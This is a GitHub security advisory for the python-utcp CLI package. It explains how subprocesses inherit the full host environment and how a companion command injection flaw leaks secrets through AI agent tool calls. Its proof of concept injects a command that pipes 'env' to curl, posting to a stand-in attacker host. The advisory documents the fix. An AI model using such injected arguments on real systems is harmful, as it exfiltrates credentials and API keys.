# [H] python-utcp: Full Process Environment Exposed to CLI Subprocess - Secrets Leakage via Command Injection

## Summary
Severity: High
Advisory: GHSA-5v57-8rxj-3p2r
CVE: CVE-2026-45370
CWE: CWE-526
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-5v57-8rxj-3p2r
Type: github-advisory

## Affected
- PyPI: `utcp-cli` — affected >=0 <1.1.2

## Details
## Summary

`_prepare_environment()` in `cli_communication_protocol.py` passes a full copy of `os.environ` to every CLI subprocess. When combined with the Command Injection vulnerability (CWE-78) in `_substitute_utcp_args()` tracked as GHSA-33p6-5jxp-p3x4, an attacker can exfiltrate all process-level secrets in a single tool call.

## Vulnerable Code

```python
# cli_communication_protocol.py
def _prepare_environment(self, provider: CliCallTemplate) -> Dict[str, str]:
    env = os.environ.copy()        # All secrets inherited
    if provider.env_vars:
        env.update(provider.env_vars)
    return env
```

## Impact

Any environment variable present in the host process is accessible to injected commands. In typical AI agent deployments this includes:

- Cloud provider credentials (AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET)
- Database connection strings (DATABASE_URL)
- LLM API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY)
- Internal service tokens

## Proof of Concept

```python
# Tool defined as:
{"command": "grep UTCP_ARG_pattern_UTCP_END logfile.txt"}

# Attacker supplies:
tool_args = {"pattern": "x; env | curl -s -d @- https://attacker.com"}

# Executed bash script:
# CMD_0_OUTPUT=$(grep x; env | curl -s -d @- https://attacker.com 2>&1)
# -> Full env dump sent to attacker including all secrets
```

## Patched

Fixed in `utcp-cli` 1.1.2. `_prepare_environment` no longer copies the full host environment. Inheritance is controlled by a new `CliCallTemplate.inherit_env_vars` field:

- `null` (default): a small built-in OS-specific allowlist (`PATH`, `HOME`, `LANG` on Unix; `PATH`, `PATHEXT`, `SYSTEMROOT`, `USERPROFILE`, etc. on Windows) is inherited so shells and binaries continue to work.
- `[]`: strict mode -- nothing from the host environment reaches the subprocess; only `env_vars` is propagated.
- `["FOO", "BAR"]`: exactly those host variables are inherited (replaces, not merges with, the default allowlist).

`env_vars` is always layered on top and overrides any inherited value. Secrets like `OPENAI_API_KEY` no longer reach the subprocess unless the call template explicitly opts them in.

## Mitigation

Upgrade to `utcp-cli >= 1.1.2`. There is no workaround in earlier versions short of stripping secrets from the host process before any CLI tool call.

## Credit

Reported by @ZeroXJacks.

## References
- https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-5v57-8rxj-3p2r
- https://nvd.nist.gov/vuln/detail/CVE-2026-45370
- https://github.com/universal-tool-calling-protocol/python-utcp
